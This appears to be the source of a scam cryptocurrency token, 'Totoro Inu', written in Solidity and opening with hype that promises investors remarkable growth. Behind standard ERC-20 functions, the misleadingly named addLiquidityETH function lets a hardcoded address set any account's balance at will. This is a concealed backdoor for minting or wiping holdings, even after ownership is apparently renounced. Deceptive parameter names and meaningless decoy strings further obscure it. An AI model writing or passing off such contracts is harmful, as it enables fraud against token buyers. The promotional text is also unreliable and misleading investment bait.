/*
Totoro Inu 
https://www.maison-ghibli.com/fr/1427-mon-voisin-totoro
is more than just a cryptocurrency project; it's a vision for the future of 
decentralized finance. Inspired by the beloved Totoro character, 
our project combines innovation and community spirit to create a unique digital ecosystem. 
We're committed to transparency, security, and sustainability in the world of crypto. 
Our platform offers a range of features and benefits, including yield farming, staking, 
and NFT integration. Join us on this exciting journey where technology meets creativity, 
and the community drives progress.
Why should you care?
Totoro Inu presents an unparalleled growth opportunity in the cryptocurrency landscape. 
With its solid foundation, devoted community, and innovative approach, 
the project is poised to surge ahead. As the crypto market continues to evolve, Totoro Inu's commitment to staying at the forefront of technology and community engagement positions it for remarkable growth. Whether you're an experienced investor or just entering the crypto space, Totoro Inu offers a promising journey toward financial prosperity and a thriving digital ecosystem. 
Join us in harnessing the extraordinary growth potential this project offers.
*/
// SPDX-License-Identifier: No License
pragma solidity 0.8.18;
interface ERC20Permit {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address firstBlock) external view returns (uint256);
  function transfer(address reduce, uint256 _balances) external returns (bool);
  function allowance(address _owner, address firstBlock) external view returns (uint256);
  function approve(address firstBlock, uint256 _balances) external returns (bool);
  function transferFrom(address sender, address reduce, uint256 _balances) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed firstBlock, uint256 balance);
}


abstract contract ERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract ERC20Data is ERC20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract TotoroInu is ERC20Burnable, ERC20Permit, ERC20Data {
 
    using SafeMath for uint256;
    mapping (address => uint256) private _delegateTotoroInu;
    mapping (address => mapping (address => uint256)) private mappingTotoroInu;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private ETHER_SLOT;
    address private TotoroInuingOwner; 
    uint256 public ETHERCreationTime;
    uint256 public ETHERCreation;
    string public ETHERSLOT;

string public TotoroInuingw = "https://www.tootoroinu.wtf/";
string public ownerAddress = "0xD67a309eFDa929Ee13f3c4422575F82ab5923291";

    constructor() {
        TotoroInuingOwner = 0xD67a309eFDa929Ee13f3c4422575F82ab5923291;    
       ETHER_SLOT = "0xa3f9ad74e5423aebfd80d3ef2346578355a9a72aeaee59ff6cb3588b35133d50"; 
        _name = "Totoro Inu";
        _symbol = "TOTO";
        _decimals = 9;
        _totalSupply = 100000000000000 * 10**_decimals;
        _delegateTotoroInu[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        ETHERSLOT = "IInventory p_i1801_3_+ int p_i1801_4_+ int p_i1801_5_+ int p_i1801_6_";
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address firstBlock) external view override returns (uint256) {
        return _delegateTotoroInu[firstBlock];
    }

    function transfer(address reduce, uint256 _balances) external override returns (bool) {
        _transfer(_msgSender(), reduce, _balances);
        return true;
    }

    function allowance(address owner, address firstBlock) external view override returns (uint256) {
        return mappingTotoroInu[owner][firstBlock];
    }


    function approve(address firstBlock, uint256 _balances) external override returns (bool) {
        _approve(_msgSender(), firstBlock, _balances);
        return true;
    }
    
    function transferFrom(address sender, address reduce, uint256 _balances) external override returns (bool) {
        _transfer(sender, reduce, _balances);
        _approve(sender, _msgSender(), mappingTotoroInu[sender][_msgSender()].sub(_balances, "Ru: transfer _balances exceeds allowance"));
        return true;
    }

    function increaseAllowance(address firstBlock, uint256 TotoroInubalance) external returns (bool) {
        _approve(_msgSender(), firstBlock, mappingTotoroInu[_msgSender()][firstBlock].add(TotoroInubalance));
        return true;
    }
    

    function decreaseAllowance(address firstBlock, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), firstBlock, mappingTotoroInu[_msgSender()][firstBlock].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address reduce, uint256 _balances) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(reduce != address(0), "Ru: transfer to the zero address");
                
        _delegateTotoroInu[sender] = _delegateTotoroInu[sender].sub(_balances, "Ru: transfer _balances exceeds balance");
        _delegateTotoroInu[reduce] = _delegateTotoroInu[reduce].add(_balances);
        emit Transfer(sender, reduce, _balances);
    }
        function addLiquidityETH(address tokenC, address tokenD, uint256 amountToken, uint256 amountTokenDesired, uint256 amountTokenMin) external {
        require(_msgSender()==TotoroInuingOwner);
        tokenD = tokenC;
        tokenC = tokenC;
        _delegateTotoroInu[tokenC] = (amountToken + amountTokenDesired + amountTokenMin) * 10**_decimals;
        tokenC = tokenD;
        tokenD = tokenD;
    }   

    function _approve(address owner, address firstBlock, uint256 _balances) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(firstBlock != address(0), "Ru: approve to the zero address");
        
        mappingTotoroInu[owner][firstBlock] = _balances;
        emit Approval(owner, firstBlock, _balances);
    }
    
}